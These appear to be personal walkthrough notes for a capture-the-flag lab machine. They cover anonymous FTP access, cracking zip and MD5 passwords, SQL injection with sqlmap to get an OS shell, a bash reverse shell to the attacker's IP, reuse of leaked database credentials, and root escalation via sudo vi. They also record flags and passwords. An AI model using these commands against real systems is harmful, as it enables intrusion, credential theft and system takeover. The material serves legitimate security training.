[[ping]] the host
sudo nmap -sC  -sV --min-rate=1000 \[host]
*nmap shows that FTP has anonymous login*
ftp \[target host IP]
anonymous
dir
get backup.zip
exit
ls
unzip backup.zip
sudo apt install john
zip2john backup.zip > hashes
gunzip /usr/share/wordlists/rockyou.txt.gz
john -wordlist=/usr/share/wordlists/rockyou.txt hashes
john --show hashes
unzip backup.zip
*use acquired password. Read the files. index.php shows that password is md5 hash 2cb42f8734ea607eefed3b70af13bbd3, which can be cracked and shows as qwerty789
Can be cracked using crackstation.net, or can be done by the following:*
hasid \[hash]
echo '\[hash]' > hash
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
*use the acquired password to log in to the website. Doing a search shows that the variable search is a parameter in the URL, and adding a quote mark ' causes an error, indicating possible SQL injection vulnerability. Can use [[sqlmap]]*

sudo apt install sqlmap
sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' -- cookie="PHPSESSID=\[cookie]" --os-shell

sudo nc -lvnp 443
bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"

*make sure the shell is fully interactive:*
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
cd ../..
cat user.txt *ec9b13ca4d6229cd5cc1e09980965bf7*

*We will try to find the password in the /var/www/html folder, since the machine uses both PHP & SQL, meaning that there should be credentials in clear text.*
cat dashboard.php *$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");*

ssh postgres@\[target host IP]
sudo -l *to see what superuser privileges user has. Reveals: User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf 

sudo vi -c ':!/bin/sh' /dev/null

*We are unable to execute the following command because sudo is restricted to only /bin/vi /etc/postgresql/11/main/pg_hba.conf . There's also an alternative way according to GTFOBins:
vi
:set shell=/bin/sh
:shell*

sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
*enter :set shell=/bin/sh and then :shell. This runs a shell as root, since vi was started with sudo*

whoami
id
cd /root
bash
ls
cat root.txt *dd6e058e814260bc70e9bbdef2715849*
